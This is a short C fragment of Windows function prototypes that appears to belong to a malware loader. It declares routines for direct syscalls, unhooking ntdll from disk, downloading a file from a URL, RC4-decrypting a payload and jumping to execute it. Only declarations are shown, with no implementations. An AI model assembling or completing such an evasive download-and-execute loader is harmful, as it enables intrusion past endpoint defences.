#include <Windows.h>
#include <stdio.h>
#include "Structs.h"

BOOL InitializeNtSyscalls();
VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString);
BOOL UnhookNtdllFromDisk(IN HMODULE hNtdllBase);
BOOL FetchFileFromURLW(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize);
BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
VOID jmpExec(void* ptr);
LPVOID LdrLoadDll(IN LPWSTR ModuleName);
int _wsprintfW(wchar_t* szDest, size_t szDestSize, const wchar_t* szFormat, ...);
void* _memcpy(void* dest, const void* src, size_t count);
extern void* __cdecl memset(void*, int, size_t);
LPWSTR _wcscpy(LPWSTR dest, LPCWSTR src);
SIZE_T _wcslen(LPCWSTR str);